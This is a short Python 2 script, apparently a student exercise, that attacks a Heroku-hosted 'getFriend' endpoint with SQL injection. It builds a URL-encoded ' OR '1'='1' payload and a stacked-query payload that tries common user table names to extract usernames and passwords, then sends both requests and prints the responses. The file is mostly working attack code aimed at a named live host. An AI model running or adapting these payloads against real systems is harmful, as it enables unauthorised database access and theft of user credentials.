import urllib2
import httplib

class ex1(object):



   def booleanattack( str ):
      return str + "'%20OR%20'1'='1'%20--%20"

   def is_request_successful(code):
      return code == 200

   def check_multiple_query ( str ):
      normal_table_name = ['User', 'Users', 'user', 'users']
      for table in normal_table_name:
         mystr = str + "'%3B%20Select%20username,%20password%20from%20"
         mystr += table
         mystr += "%3B--%20"
         print(urllib2.urlopen(mystr).read())
         # return str + "'%3B%20Select%20username,%20password%20from%20Users%3B--%20"

   origin = "https://lit-garden-23003.herokuapp.com/getFriend/user1"

   a = booleanattack("https://lit-garden-23003.herokuapp.com/getFriend/user1")
   print(a)

   contents = urllib2.urlopen(a)
   print(contents.read())
   print contents.getcode()

   # b = check_multiple_query(origin)
   # print(b)
   # contents2 = urllib2.urlopen(b)
   # print(contents2.read())
   # print contents2.getcode()
   check_multiple_query(origin)
